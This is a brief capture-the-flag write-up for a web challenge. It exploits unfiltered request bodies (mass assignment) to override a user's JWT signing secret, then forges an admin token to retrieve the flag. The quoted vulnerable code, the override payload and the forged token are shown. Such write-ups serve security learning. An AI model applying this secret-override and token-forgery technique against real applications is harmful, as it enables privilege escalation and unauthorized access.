## Write Up
```js
users[user.name] = {
    secret: nanoid(32),
    ...user,
};
```

The following payload can be used to set an arbitrary JWT secret for your user, as the request body is not filtered and thus can override `secret`. We cannot directly tamper the `admin` property as the server checks for the string `"admin"` in the request body.

```js
{
    "user": {
        "name": "zz",
        "secret": "Jp_wtk93fWqUTxA8nQciUdc7yhG1_xXU"
    }
}
```

Now that we control and know the `secret` used for JWTs when `name == "zz"`, we can simply sign a JWT with that secret and `admin` set to true.

```json
{
  "name": "zz",
  "admin": true
}
```

(I used jwt.io to modify the existing token since I'm lazy)

Now you can put the resulting token into body when requesting `/flag` and obtain the flag.
```json
{
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoienoiLCJhZG1pbiI6dHJ1ZSwic2VjcmV0IjoiSnBfd3RrOTNmV3FVVHhBOG5RY2lVZGM3eWhHMV94WFUiLCJpYXQiOjE3NDAyOTAzNTJ9.kjJuioAXS6FGoQcVZOrsq4izkkRY6XIhDXc6NL7PCTA"
}
```
